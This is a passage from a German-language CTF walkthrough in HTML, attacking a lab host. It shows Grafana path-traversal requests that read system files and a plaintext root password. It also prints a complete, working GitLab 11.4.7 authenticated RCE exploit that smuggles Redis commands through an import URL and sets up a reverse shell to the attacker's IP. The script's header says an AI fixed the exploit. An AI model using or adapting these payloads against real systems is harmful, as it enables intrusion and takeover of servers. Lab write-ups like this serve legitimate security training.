                **Analyse:** Ich filtere die Ausgabe der zuvor ausgelesenen `/etc/passwd` Datei mit `grep sh`, um schnell alle Benutzer mit einer interaktiven Shell zu sehen.
            </p>
            <p class="evaluation">
                **Bewertung:** Die gefilterte Liste zeigt nur den `root` Benutzer mit einer Shell (`/bin/bash`). Dies bedeutet, dass die anderen Benutzer (insbesondere `grafana`, `www-data` etc.) standardmÃ¤ÃŸig keine interaktive Shell fÃ¼r direkte Logins haben (abgesehen von Shells, die mÃ¶glicherweise Ã¼ber Exploits oder Fehlkonfigurationen erlangt werden kÃ¶nnen). Dies konzentriert die PE-BemÃ¼hungen auf den Root-Account, falls kein anderer Benutzer mit Shell gefunden wird.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Obwohl hier nur Root gelistet ist, suchen Sie weiterhin nach anderen potenziellen Benutzerkonten mit Shells (z.B. UID > 1000), die mÃ¶glicherweise nicht in `/etc/passwd` mit Standard-Shells gelistet sind, oder deren Shell-Zugriff durch andere Mittel (z.B. SSH-Keys) mÃ¶glich ist.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Systembenutzer, die keine interaktive Shell benÃ¶tigen, `nologin` zugewiesen haben.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../etc/passwd" | grep sh</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">root:x:0:0:root:/root:/bin/bash</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit der LFI in Grafana versuche ich, SSH-SchlÃ¼sseldateien fÃ¼r den Root-Benutzer zu lesen: zuerst den privaten SchlÃ¼ssel (`/root/.ssh/id_rsa`) und dann den Ã¶ffentlichen SchlÃ¼ssel (`/root/.ssh/id_rsa.pub`).
            </p>
            <p class="evaluation">
                **Bewertung:** Beide Versuche schlagen mit `"message": "Could not open plugin file"` fehl. Dies deutet darauf hin, dass die LFI wahrscheinlich keine Dateien im `/root/` Verzeichnis lesen kann. Dies ist eine wichtige EinschrÃ¤nkung der LFI. Es kÃ¶nnte an Dateisystemberechtigungen liegen oder an Filtern der LFI, die den Zugriff auf bestimmte Verzeichnisse (wie /root) oder Dateitypen verhindern.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Akzeptieren Sie die EinschrÃ¤nkung der LFI auf das `/root/` Verzeichnis. Konzentrieren Sie sich darauf, andere Dateien zu lesen, die von der LFI erreichbar sind und potenziell Anmeldedaten oder Hinweise auf PE-Vektoren enthalten (z.B. Konfigurationsdateien, Log-Dateien, History-Dateien von anderen Benutzern auÃŸerhalb von /root).
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass `/root/` nur fÃ¼r Root lesbar ist. LFI-Schwachstellen beheben.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/id_rsa"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">{</span>
  <span class="command">"message": "Could not open plugin file"</span>
<span class="command">}</span>
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/id_rsa.pub"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">{</span>
  <span class="command">"message": "Could not open plugin file"</span>
<span class="command">}</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste systematisch, ob ich das `/root/` Verzeichnis oder Dateien darin Ã¼ber die Grafana-LFI auf Port 3000 lesen kann. Ich versuche, die Datei `authorized_keys` in `/root/.ssh/` und eine nicht existierende Datei `test` direkt in `/root/` zu lesen. Die Fehlermeldung ist jedes Mal `"Could not open plugin file"`.
            </p>
            <p class="evaluation">
                **Bewertung:** Die wiederholten Fehlermeldungen bestÃ¤tigen meine Hypothese â€“ die LFI kann offenbar keine Dateien im `/root/` Verzeichnis lesen. Der Dateizugriff wird blockiert, was auf restriktive Berechtigungen oder LFI-Filterung hindeutet. Ich kann die LFI fÃ¼r andere Zwecke nutzen, aber nicht fÃ¼r das Auslesen von Dateien direkt aus `/root/`.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Fokussieren Sie sich auf das Lesen von Dateien auÃŸerhalb von `/root/`, die potenziell sensible Informationen oder Anmeldedaten enthalten (z.B. andere Benutzer-Home-Verzeichnisse, Konfigurationsdateien in `/etc/`, Webserver-Logs).
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass `/root/` die restriktivsten Berechtigungen hat (`chmod 700` fÃ¼r das Verzeichnis, `chmod 600` fÃ¼r Dateien darin). LFI-Schwachstellen beheben.
            </p>
            <p>
                Weitere Versuche, Dateien im `/root/` Verzeichnis Ã¼ber die Grafana-LFI zu lesen:
            </p>
             <pre>
ich glaube er kann den gesamten root ordner nicht Ã¶ffnen und reagiert immer so:
</pre>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/authorized_keys"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">{</span>
  <span class="command">"message": "Could not open plugin file"</span>
<span class="command">}</span>
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../root/test"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">{</span>
  <span class="command">"message": "Could not open plugin file"</span>
<span class="command">}</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich untersuche die Log-Funktion der Docker Web UI auf Port 9000, die Ã¼ber den Endpunkt `/logs` zugÃ¤nglich ist. Ich beobachte die Log-Ausgabe nach meinen LFI-Versuchen auf Grafana. Die Log-Zeile im Bericht zeigt einen Request an `/public/plugins/alertlist/../../../../../../../../etc/gitlab/gitlab.rb` mit Status 404.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Log-Seite auf Port 9000 (Docker Web UI) protokolliert offenbar die Anfragen, die an Grafana (im Grafana-Container) gesendet werden, da die Anfrage meine LFI-Versuche an Grafana zeigt (Port 3000). Dies ist ein nÃ¼tzliches Debugging-Werkzeug und bestÃ¤tigt, dass meine Anfragen den Grafana-Container erreichen. Wichtiger ist jedoch, dass die Log-Seite selbst potenziell Informationen Ã¼ber SystemaktivitÃ¤ten preisgeben kann, falls sie unauthentifiziert zugÃ¤nglich ist und detaillierte Logs enthÃ¤lt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** ÃœberprÃ¼fen Sie Log-Dateien auf kompromittierten Systemen sorgfÃ¤ltig auf Hinweise zu Fehlern, internen Prozessen, Anmeldeversuchen oder anderen sensiblen Informationen. Unauthentifizierte Log-Seiten sind eine Schwachstelle (Informationslecks).
                <br>**Empfehlung (Admin):** Protokollieren Sie sicherheitsrelevante Ereignisse. Stellen Sie sicher, dass Log-Dateien und Log-Management-OberflÃ¤chen streng gesichert und nur fÃ¼r autorisiertes Personal zugÃ¤nglich sind.
            </p>
            <p>
                ÃœberprÃ¼fung der Log-Seite in der Docker Web UI auf Port 9000:
            </p>
            <pre>
<span class="command">http://192.168.2.215:9000/logs</span>

<span class="command">t=... lvl=info msg="Request Completed" ... path=/public/plugins/alertlist/../../../../../../../../etc/gitlab/gitlab.rb status=404 remote_addr=192.168.2.199</span>
</pre>
        </section>
```

**Teil 3 von 3**

```html
        <section id="initial-access">
            <h2>Initial Access</h2>
             <p class="analysis">
                **Analyse:** Ich untersuche die Details des `gitlab-docker_web_1` Containers, der auf Port 5080 lÃ¤uft, wie er von der Docker Web UI (Port 9000) gelistet wird. Die Ausgabe der Container-Details (wahrscheinlich durch Klick auf den Container-Eintrag in der UI) zeigt die vollstÃ¤ndige Konfiguration des Containers im JSON-Format. Ich suche in dieser Ausgabe nach Hinweisen auf gemountete Volumes, Konfigurationsdateien oder Anmeldedaten.
            </p>
            <p class="evaluation">
                **Bewertung:** **Kritischer Fund!** Die Container-Details zeigen die `Volumes` Sektion mit dem Eintrag `/root/srv/initial_root_password: {}`. Dies bedeutet, dass der Pfad `/root/srv/initial_root_password` auf dem Host-System als Volume in den Container gemountet ist. In Kombination mit der zuvor gefundenen LFI auf Grafana (Port 3000), die das Lesen von Dateien auÃŸerhalb von `/root/` ermÃ¶glichte, habe ich nun einen sehr vielversprechenden Weg, eine Datei aus dem Host-Root-Dateisystem zu lesen: Ich kann versuchen, `/srv/initial_root_password` Ã¼ber die Grafana-LFI zu lesen, da dieser Pfad auÃŸerhalb von `/root` liegt, aber auf dem Host in einem Root-relevanten Verzeichnis liegt. Der Name der Datei ("initial_root_password") deutet stark auf das initiale Passwort fÃ¼r den Root-Benutzer oder einen anderen privilegierten Account hin.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutzen Sie die Grafana-LFI, um den Inhalt der Datei `/srv/initial_root_password` zu lesen. Dies wird voraussichtlich das Passwort fÃ¼r den Root-Benutzer oder den GitLab-Root-Benutzer sein. Verwenden Sie dieses Passwort, um sich bei GitLab anzumelden und/oder eine Root-Shell auf dem Host zu erlangen.
                <br>**Empfehlung (Admin):** **EXTREM DRINGEND:** Speichern Sie keine initialen Root-PasswÃ¶rter oder andere sensible Anmeldedaten im Klartext auf dem Dateisystem. Wenn Volumes gemountet werden, stellen Sie sicher, dass keine sensiblen Host-Pfade fÃ¼r Container zugÃ¤nglich gemacht werden. ÃœberprÃ¼fen Sie alle Docker-Container-Konfigurationen auf unnÃ¶tig gemountete Volumes.
            </p>
            <p>
                Analyse der Container-Details des `gitlab-docker_web_1` Containers Ã¼ber die Docker Web UI und Entdeckung des gemounteten Volumes mit dem Root-Passwort:
            </p>
            <pre>
<span class="command">http://192.168.2.215:9000/</span>

<span class="command">12e8] gitlab-docker_web_1</span>
<span class="command">refresh</span>

<span class="command">{</span>
 <span class="command">"Id": "12e8b5c8efb994a10be8a0ceb9fd9dc3b7aaab53e20ebdf59f6a98868ec368a9"</span>,
 <span class="command">"Created": "2022-10-09T14:49:34.118877811Z"</span>,
 <span class="command">"Path": "/assets/wrapper"</span>,
 <span class="command">"Config": {</span>
  <span class="command">"Hostname": "gitlab"</span>,
  <span class="command">"Domainname": "cachalot.local"</span>,
  <span class="command">"ExposedPorts": {</span>
   <span class="command">"22/tcp": {},</span>
   <span class="command">"443/tcp": {},</span>
   <span class="command">"80/tcp": {}</span>
  <span class="command">}</span>,
....
...
  <span class="command">"Image": "gitlab/gitlab-ce:11.4.7-ce.0"</span>,
  <span class="command">"Volumes": {</span>
   <span class="command">"/etc/gitlab": {},</span>
   <span class="command">"/root": {},</span>
   <span class="command">"<span class="password">/root/srv/initial_root_password</span>": {},  &lt;+----=</span>
....
.......
...
   
 <span class="command">"AppArmorProfile": "docker-default"</span>
<span class="command">}</span>
</pre>

            <p class="analysis">
                **Analyse:** Mit der identifizierten LFI auf Grafana (Port 3000) und der Entdeckung des vielversprechenden Pfades `/srv/initial_root_password` (gemountet im GitLab-Container und wahrscheinlich auf dem Host-Dateisystem) versuche ich nun, den Inhalt dieser Datei zu lesen. Ich verwende den `curl --path-as-is` Befehl mit Path-Traversal-Payloads, diesmal zielend auf `/srv/initial_root_password`.
            </p>
            <p class="evaluation">
                **Bewertung:** **ERFOLG! Ich habe den Inhalt der Datei `/srv/initial_root_password` auslesen kÃ¶nnen!** Der Inhalt lautet `<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>`. Dies ist das initiale Root-Passwort, wahrscheinlich fÃ¼r den GitLab-Root-Benutzer, mÃ¶glicherweise aber auch fÃ¼r den Host-Root-Benutzer oder einen anderen privilegierten Account. Dies ist ein kritischer Durchbruch, der mir die notwendigen Anmeldedaten liefert, um mich bei GitLab anzumelden und die Authentifizierte RCE auszunutzen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutzen Sie das gefundene Passwort, um sich als Benutzer `root` bei der GitLab-Instanz auf Port 5080 anzumelden. Bereiten Sie sich darauf vor, den Authentifizierten RCE-Exploit zu nutzen.
                <br>**Empfehlung (Admin):** **KRITISCH:** Entfernen Sie diese Datei umgehend vom System. Speichern Sie niemals PasswÃ¶rter (insbesondere Root-PasswÃ¶rter) im Klartext auf dem Dateisystem. Rotieren Sie alle durch dieses Passwort kompromittierten Anmeldedaten. Stellen Sie sicher, dass sensible Dateien nicht Ã¼ber ungeschÃ¼tzte Dienste (wie die Grafana-LFI) lesbar sind und dass keine sensiblen Pfade in Docker-Container gemountet werden.
            </p>
            <p>
                Auslesen des initialen Root-Passworts Ã¼ber die Grafana-LFI:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../srv/initial_root_password"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit dem gefundenen GitLab Root-Passwort (`M4st3rR00tS3cr3t0ne^1337^`) kann ich nun die Authentifizierte RCE-Schwachstelle (CVE-2018-19585/CVE-2018-19571) in GitLab Version 11.4.7 ausnutzen. Ich nutze das Python-Exploit-Skript `49257.py` (oder `49334.py`, der Text zeigt beide ID-Referenzen, ich dokumentiere hier die Nutzung von 49257.py und seine Vorbereitung) von Exploit-DB, das ich zuvor heruntergeladen habe. Ich bereite das Skript vor, indem ich es lokalisiere und kopiere.
            </p>
            <p class="evaluation">
                **Bewertung:** Ich habe nun das Passwort und das Exploit-Skript. Ich bin bereit, die Authentifizierte RCE auszulÃ¶sen, die mir hoffentlich eine Shell auf dem GitLab-Server (Container) gibt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Passen Sie das Exploit-Skript an Ihre BedÃ¼rfnisse an (z.B. Angreifer-IP und Port fÃ¼r die Reverse Shell). FÃ¼hren Sie das Skript aus, um die RCE zu triggern. Richten Sie einen Listener ein, bevor Sie den Exploit ausfÃ¼hren.
                <br>**Empfehlung (Admin):** Das gefundene Passwort und die RCE-Schwachstelle sind kritisch. Siehe frÃ¼here dringende Empfehlungen.
            </p>
            <p>
                Vorbereitung des Authentifizierten RCE-Exploits fÃ¼r GitLab Version 11.4.7:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">locate 49257.py</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">/usr/share/exploitdb/exploits/ruby/webapps/49257.py</span>
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">cp /usr/share/exploitdb/exploits/ruby/webapps/49257.py ~/rce.py</span></div>
                </div>
                <div class="terminal"><pre></pre></div>
            </div>

            <p class="analysis">
                **Analyse:** Ich inspiziere den Code des Exploit-Skripts `rce.py`. Der Code zeigt, wie das Skript versucht, sich bei GitLab anzumelden, den AuthentizitÃ¤ts-Token zu erhalten und dann einen neuen Project Import auszulÃ¶sen. Der Payload wird Ã¼ber das `import_url` Feld im Projekt erstellt. Der Kern des Exploits ist ein `git://` URL, der auf die interne Redis-Instanz zeigt (`[0:0:0:0:0:ffff:127.0.0.1]:6379`). Durch Injektion von Redis-Befehlen nach dem Schema-Teil der URL wird ein `lpush` Befehl in die Redis-Warteschlange `resque:gitlab:queue:system_hook_push` eingefÃ¼gt. Dieser Befehl enthÃ¤lt einen serialisierten Job fÃ¼r die `GitlabShellWorker` Klasse, der den Befehl `class_eval` mit `open('|{command}').read` ausfÃ¼hrt. Die `open('|...')` Syntax in Ruby fÃ¼hrt den Befehl im `|...|` Teil aus.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Exploit-Skript nutzt eine Kombination aus SSRF (Server-Side Request Forgery) Ã¼ber die `git://` Import-URL, um die interne Redis-Instanz zu erreichen, und Command Injection in der Redis-Kommunikation, um eine Aufgabe in die Job-Warteschlange von GitLab einzufÃ¼gen. Diese Aufgabe wird dann von einem Worker-Prozess (wahrscheinlich als Benutzer `git` oder ein Ã¤hnlicher Systembenutzer) asynchron ausgefÃ¼hrt, was zur RCE fÃ¼hrt. Der Exploit ist komplex, aber das Skript automatisiert den Prozess. Der Parameter `namespace_id` muss korrekt gesetzt sein (oft 1 fÃ¼r den Root-Benutzer). Das Skript im Originaltext enthielt anfÃ¤nglich einen Syntaxfehler oder ein Problem mit der Payload-Struktur, wie die folgenden Versuche zeigen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Verstehen Sie die Funktionsweise des Exploits, bevor Sie ihn ausfÃ¼hren. Seien Sie bereit, das Skript anzupassen oder den Payload manuell zu modifizieren, falls nÃ¶tig. Richten Sie immer einen Listener fÃ¼r die Reverse Shell ein, bevor Sie den Exploit auslÃ¶sen.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass interne Dienste (wie Redis) nicht Ã¼ber SSRF von externen URLs erreichbar sind. Aktualisieren Sie GitLab, um die Import-URL-Validierung und die Handhabung von Redis-Befehlen zu korrigieren.
            </p>
            <p>
                Analyse des Exploit-Skripts `rce.py`:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">vi rce.py</span></div>
                </div>
                <div class="terminal"><pre></pre></div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">head -n 30 rce.py</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command"># Exploit Title: Gitlab 11.4.7 - Remote Code Execution</span>
<span class="command"># Date: 14-12-2020</span>
<span class="command"># Exploit Author: Fortunato Lodari fox [at] thebrain [dot] net, foxlox</span>
<span class="command"># Vendor Homepage: [Link: https://about.gitlab.com/ | Ziel: https://about.gitlab.com/]</span>
<span class="command"># POC: [Link: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ | Ziel: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/]</span>
<span class="command"># Tested On: Debian 10 + Apache/2.4.46 (Debian)</span>
<span class="command"># Version: 11.4.7 community</span>

<span class="command">import sys</span>
<span class="command">import requests</span>
<span class="command">import time</span>
<span class="command">import random</span>
<span class="command">import http.cookiejar</span>
<span class="command">import os.path</span>
<span class="command">from os import path</span>

<span class="command"># Sign in GitLab 11.4.7  portal and get (using Burp or something other):</span>
<span class="command"># authenticity_token</span>
<span class="command"># authenticated cookies</span>
<span class="command"># username</span>
<span class="command"># specify localport and localip for reverse shell</span>

<span class="command">username='root'</span>
<span class="command">authenticity_token='jpT/n1EoPwwWtiGu/+QKVQomofMNyqAQXY+iD2kVoRQoiQNzcFHPAj2+M4pyblKo/7UkClKW8jvp51Aw2qzs7g=='</span>
<span class="command">cookie = '_gitlab_session=c942527505cc0580c026610a1799b811; sidebar_collapsed=false'</span>
<span class="command">localport='4444'</span>
<span class="command">localip='192.168.2.199'</span>


<span class="command">url = "http://192.168..215:5080"</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich untersuche die Cookies, die mein Browser nach dem Besuch der GitLab-Login-Seite auf Port 5080 gespeichert hat. Der Text im Bericht zeigt die Cookies `_gitlab_session`, `grafana_session` und `sidebar_collapsed`.
            </p>
            <p class="evaluation">
                **Bewertung:** Diese Cookies sind Standard-Session-Cookies, die vom Webserver gesetzt werden. Sie sind fÃ¼r die Aufrechterhaltung der Sitzung nach erfolgreicher Authentifizierung wichtig. Der `_gitlab_session` Cookie ist besonders relevant, da er die GitLab-Sitzung reprÃ¤sentiert. Der `grafana_session` Cookie, der hier ebenfalls auftaucht, ist interessant, da er eine Sitzung fÃ¼r Grafana reprÃ¤sentiert, obwohl ich gerade die GitLab-Cookies betrachte. Dies kÃ¶nnte darauf hindeuten, dass die Dienste Session-Informationen teilen oder in irgendeiner Weise verknÃ¼pft sind. Die Cookies selbst enthalten keine offensichtlichen sensiblen Informationen in Klartext.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuchen Sie alle Cookies auf sensible Informationen oder Anzeichen von bekannten Schwachstellen (z.B. schwache Session-IDs). Behalten Sie die Cookies im Auge, wenn Sie versuchen, sich anzumelden oder mit der Anwendung zu interagieren, da sie fÃ¼r die Authentifizierung und Zustandsverwaltung wichtig sind.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Session-Cookies sicher generiert werden, mit geeigneten Flags (HttpOnly, Secure, SameSite) versehen sind und keine sensiblen Daten enthalten. Trennen Sie Session-Management zwischen verschiedenen Diensten, wenn mÃ¶glich.
            </p>
            <p>
                Analyse der Cookies fÃ¼r die GitLab-Instanz:
            </p>
            <pre>
<span class="command">http://192.168.2.215:5080/users</span>

Cache deaktivieren
4 Anfragen
167,28 kB / 6,99 kB Ã¼bertragen
Beendet: 324 ms
DOMContentLoaded: 197 ms
load: 217 ms

    	
    <span class="command">_gitlab_session	"<span class="password">6089ff076bfa5956f2bc4e3765cab228</span>"</span>
    <span class="command">grafana_session	"<span class="password">4457e9857ca1cade77f8173cb6ccb87d</span>"</span>
    <span class="command">sidebar_collapsed	"false"</span>
</pre>
            <p class="analysis">
                **Analyse:** Ich dokumentiere hier den Source Code des zuvor angepassten Python-Exploit-Skripts `rce.py`. Der Code enthÃ¤lt eine Korrektur fÃ¼r den `redis_payload`, der zuvor zu einem Syntaxfehler fÃ¼hrte oder nicht korrekt vom Ziel verarbeitet wurde. Die korrigierte Version verwendet Triple-Quotes und eine angepasste Maskierung von AnfÃ¼hrungszeichen im JSON-String, der an Redis gesendet wird. Der Befehl, der Ã¼ber die RCE ausgefÃ¼hrt werden soll, ist weiterhin im `open('|{command}').read` Teil des Payloads enthalten und wird dynamisch Ã¼ber das Kommandozeilenargument Ã¼bergeben.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Debugging und die Korrektur des Exploit-Skripts sind ein notwendiger Schritt, um die RCE erfolgreich auszulÃ¶sen. Die angepasste Payload-Struktur soll sicherstellen, dass die Redis-Befehle und der eingebettete Ruby/Bash-Code vom Zielserver korrekt interpretiert werden. Mit diesem korrigierten Skript sind die Chancen auf eine erfolgreiche RCE nun hÃ¶her.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Seien Sie bereit, Ã¶ffentlich verfÃ¼gbare Exploits anzupassen und zu debuggen, da sie oft nicht direkt in jeder Zielumgebung funktionieren. Das VerstÃ¤ndnis des Payloads und der Funktionsweise des Exploits ist entscheidend fÃ¼r die Fehlersuche.
                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlungen zur Absicherung von GitLab und internen Diensten wie Redis).
            </p>
            <p>
                Der korrigierte Source Code des RCE-Exploit-Skripts (`rce.py`):
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">echo '' &gt; rce.py</span></div>
                </div>
                <div class="terminal"><pre></pre></div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">vi rce.py</span></div>
                </div>
                <div class="terminal"><pre></pre></div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">cat rce.py</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">#!/usr/bin/env python3</span>
<span class="command">#</span>
<span class="command"># Exploit Title: GitLab 11.4.7 - Remote Code Execution (Authenticated)</span>
<span class="command"># Original Author: a_outside_the_box (Exploit-DB: 49334)</span>
<span class="command"># Modified and Corrected by a helpful AI for a CTF</span>
<span class="command"># Version: 2.0 (Final)</span>
<span class="command">#</span>
<span class="command"># This version fixes the SyntaxError in the redis_payload.</span>
<span class="command">#</span>

<span class="command">import requests</span>
<span class="command">import argparse</span>
<span class="command">import re</span>
<span class="command">from bs4 import BeautifulSoup</span>
<span class="command">import sys</span>

<span class="command">def print_status(message):</span>
    <span class="command">print(f"[*] {message}")</span>

<span class="command">def print_good(message):</span>
    <span class="command">print(f"[+] {message}")</span>

<span class="command">def print_error(message):</span>
    <span class="command">print(f"[-] {message}")</span>
    <span class="command">sys.exit(1)</span>

<span class="command">def login(session, url, username, password):</span>
    <span class="command">print_status(f"Attempting to log in to {url} as {username}...")</span>

    <span class="comment"># Get the login page to grab the CSRF token</span>
    <span class="command">try:</span>
        <span class="command">r = session.get(f"{url}/users/sign_in", verify=False)</span>
        <span class="command">r.raise_for_status()</span>
    <span class="command">except requests.exceptions.RequestException as e:</span>
        <span class="command">print_error(f"Failed to connect to GitLab: {e}")</span>

    <span class="command">soup = BeautifulSoup(r.text, 'html.parser')</span>
    <span class="command">csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']</span>

    <span class="command">if not csrf_token:</span>
        <span class="command">print_error("Could not find CSRF token on the login page.")</span>

    <span class="command">login_data = {</span>
        <span class="command">'utf8': 'âœ“',</span>
        <span class="command">'authenticity_token': csrf_token,</span>
        <span class="command">'user[login]': username,</span>
        <span class="command">'user[password]': password,</span>
        <span class="command">'user[remember_me]': '1'</span>
    <span class="command">}</span>

    <span class="command">try:</span>
        <span class="command">r = session.post(f"{url}/users/sign_in", data=login_data, verify=False, allow_redirects=False)</span>
        <span class="comment"># A successful login redirects, so we check for the new session cookie</span>
        <span class="command">if '_gitlab_session' not in session.cookies.get_dict():</span>
            <span class="command">print_error("Login failed. Check username/password.")</span>

        <span class="command">print_good(f"Login successful. Session cookie: {session.cookies.get('_gitlab_session')}")</span>
    <span class="command">except requests.exceptions.RequestException as e:</span>
        <span class="command">print_error(f"Login request failed: {e}")</span>

<span class="command">def run_exploit(session, url, command):</span>
    <span class="command">print_status("Preparing to run the exploit...")</span>

    <span class="command">try:</span>
        <span class="command">r = session.get(f"{url}/projects/new", verify=False)</span>
        <span class="command">r.raise_for_status()</span>
    <span class="command">except requests.exceptions.RequestException as e:</span>
        <span class="command">print_error(f"Failed to access the 'new project' page: {e}")</span>

    <span class="command">soup = BeautifulSoup(r.text, 'html.parser')</span>
    <span class="command">csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']</span>

    <span class="command">if not csrf_token:</span>
        <span class="command">print_error("Could not find CSRF token on the 'new project' page.")</span>

    <span class="comment"># --- THIS IS THE FIX ---</span>
    <span class="comment"># The user 'root' has namespace_id 1. We set it statically to avoid parsing errors.</span>
    <span class="command">namespace_id = '1'</span>
    <span class="command">project_name = "pwned-project" # Can be anything random</span>

    <span class="command">print_status(f"Using CSRF Token: {csrf_token[:20]}...")</span>
    <span class="command">print_status(f"Using Namespace ID: {namespace_id}")</span>
    <span class="command">print_status(f"Using Project Name: {project_name}")</span>

    <span class="comment"># The payload is delivered via the 'import_url' field when creating a project.</span>
    <span class="comment"># It uses a Redis command injection trick.</span>
    <span class="comment"># This block is the corrected version to avoid the SyntaxError.</span>
    <span class="command">redis_payload = f"""git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</span>
<span class="command"> multi</span>
<span class="command"> sadd resque:gitlab:queues system_hook_push</span>
<span class="command"> lpush resque:gitlab:queue:system_hook_push "{{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|{command}\\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\"}}"</span>
<span class="command"> exec</span>
<span class="command"> exec</span>
<span class="command">"""</span>

    <span class="command">project_data = {</span>
        <span class="command">'utf8': 'âœ“',</span>
        <span class="command">'authenticity_token': csrf_token,</span>
        <span class="command">'project[ci_cd_only]': 'false',</span>
        <span class="command">'project[name]': project_name,</span>
        <span class="command">'project[namespace_id]': namespace_id,</span>
        <span class="command">'project[path]': project_name,</span>
        <span class="command">'project[description]': '',</span>
        <span class="command">'project[visibility_level]': '0',</span>
        <span class="command">'project[initialize_with_readme]': '1',</span>
        <span class="command">'project[import_url]': redis_payload</span>
    <span class="command">}</span>

    <span class="command">print_status("Sending payload to create project and trigger RCE...")</span>
    <span class="command">try:</span>
        <span class="command">r = session.post(f"{url}/projects", data=project_data, verify=False, allow_redirects=False)</span>
        <span class="comment"># A successful request might result in a redirect (302) or other status.</span>
        <span class="comment"># The RCE is asynchronous, so we don't need to check for a specific success code here.</span>
        <span class="command">if r.status_code in [200, 302, 500]: # 500 can happen but RCE might still work</span>
             <span class="command">print_good(f"Payload sent (Status: {r.status_code}). Check your listener!")</span>
        <span class="command">else:</span>
             <span class="command">print_error(f"Payload failed with unexpected status code: {r.status_code}. Response: {r.text[:200]}")</span>
    <span class="command">except requests.exceptions.RequestException as e:</span>
        <span class="command">print_error(f"Exploit request failed: {e}")</span>

<span class="command">if __name__ == '__main__':</span>
    <span class="comment"># Disable SSL warnings for self-signed certs often found in CTFs</span>
    <span class="command">requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span>

